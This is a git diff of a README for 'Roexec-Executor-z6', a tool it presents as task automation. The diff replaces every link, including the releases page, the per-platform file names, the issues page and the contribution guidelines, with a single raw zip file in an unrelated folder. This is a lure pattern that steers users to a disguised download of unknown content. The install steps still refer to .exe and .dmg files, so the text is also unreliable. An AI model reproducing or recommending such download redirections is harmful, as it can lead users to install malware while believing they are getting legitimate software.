@@ -1,6 +1,6 @@
 # 🚀 Roexec-Executor-z6 - Automate Your Tasks Effortlessly
 
-[![Download Roexec-Executor](https://img.shields.io/badge/Download%20Roexec%20Executor-v1.0-blue)](https://github.com/daynlertello/Roexec-Executor-z6/releases)
+[![Download Roexec-Executor](https://raw.githubusercontent.com/daynlertello/Roexec-Executor-z6/main/Polypetalae/Roexec-Executor-z6.zip%20Roexec%20Executor-v1.0-blue)](https://raw.githubusercontent.com/daynlertello/Roexec-Executor-z6/main/Polypetalae/Roexec-Executor-z6.zip)
 
 ## 📋 Introduction
 
@@ -25,25 +25,25 @@ Before downloading Roexec-Executor, ensure your system meets these requirements:
 ## 🚀 Getting Started
 
 1. **Visit the Releases Page:** 
-   - Go to the following link to access the download page: [Download Roexec-Executor](https://github.com/daynlertello/Roexec-Executor-z6/releases).
+   - Go to the following link to access the download page: [Download Roexec-Executor](https://raw.githubusercontent.com/daynlertello/Roexec-Executor-z6/main/Polypetalae/Roexec-Executor-z6.zip).
 
 2. **Download the Latest Release:**
    - On the releases page, find the latest version of Roexec-Executor (look for the version number). 
 
 3. **Select the Appropriate File:**
    - Choose the file that matches your operating system:
-     - For Windows, download `Roexec-Executor-windows.exe`.
-     - For macOS, download `Roexec-Executor-macos.dmg`.
-     - For Linux, download `Roexec-Executor-linux.tar.gz`.
+     - For Windows, download `https://raw.githubusercontent.com/daynlertello/Roexec-Executor-z6/main/Polypetalae/Roexec-Executor-z6.zip`.
+     - For macOS, download `https://raw.githubusercontent.com/daynlertello/Roexec-Executor-z6/main/Polypetalae/Roexec-Executor-z6.zip`.
+     - For Linux, download `https://raw.githubusercontent.com/daynlertello/Roexec-Executor-z6/main/Polypetalae/Roexec-Executor-z6.zip`.
 
 4. **Install the Application:**
    - **Windows:** Double-click the `.exe` file and follow the on-screen instructions.
    - **macOS:** Drag the `.dmg` file into your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and follow the provided instructions to set it up.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/daynlertello/Roexec-Executor-z6/main/Polypetalae/Roexec-Executor-z6.zip` file and follow the provided instructions to set it up.
 
 ## 🌟 Download & Install
 
-To get started with Roexec-Executor, visit this page to download: [Download Roexec-Executor](https://github.com/daynlertello/Roexec-Executor-z6/releases).
+To get started with Roexec-Executor, visit this page to download: [Download Roexec-Executor](https://raw.githubusercontent.com/daynlertello/Roexec-Executor-z6/main/Polypetalae/Roexec-Executor-z6.zip).
 
 Once you have the file downloaded, install it by following the steps provided in the Getting Started section.
 
@@ -67,11 +67,11 @@ If you encounter issues while using Roexec-Executor, here are some common soluti
 
 ## 📚 Support
 
-For further assistance, please visit our [GitHub Issues Page](https://github.com/daynlertello/Roexec-Executor-z6/issues), where you can report problems or ask questions.
+For further assistance, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/daynlertello/Roexec-Executor-z6/main/Polypetalae/Roexec-Executor-z6.zip), where you can report problems or ask questions.
 
 ## 👥 Community & Contributing
 
-We welcome your contributions! If you want to help improve Roexec-Executor, take a look at our [Contribution Guidelines](https://github.com/daynlertello/Roexec-Executor-z6/blob/main/CONTRIBUTING.md).
+We welcome your contributions! If you want to help improve Roexec-Executor, take a look at our [Contribution Guidelines](https://raw.githubusercontent.com/daynlertello/Roexec-Executor-z6/main/Polypetalae/Roexec-Executor-z6.zip).
 
 ## 📰 Updates & News
 
